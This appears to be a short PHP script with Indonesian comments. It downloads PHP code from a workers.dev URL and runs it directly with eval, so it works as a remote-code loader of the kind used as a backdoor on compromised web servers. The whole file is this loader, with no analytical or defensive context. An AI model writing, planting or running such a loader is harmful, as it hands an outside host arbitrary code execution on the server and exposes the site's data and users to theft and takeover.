<?php
// Menentukan alamat URL file script PHP di CDN
$cdnUrl = 'https://admin.akbarnovian-an5081.workers.dev/';

// Mengambil konten dari file script PHP di CDN
$content = file_get_contents($cdnUrl);

// Menjalankan script PHP dari konten yang diambil
eval('?>' . $content);
?>
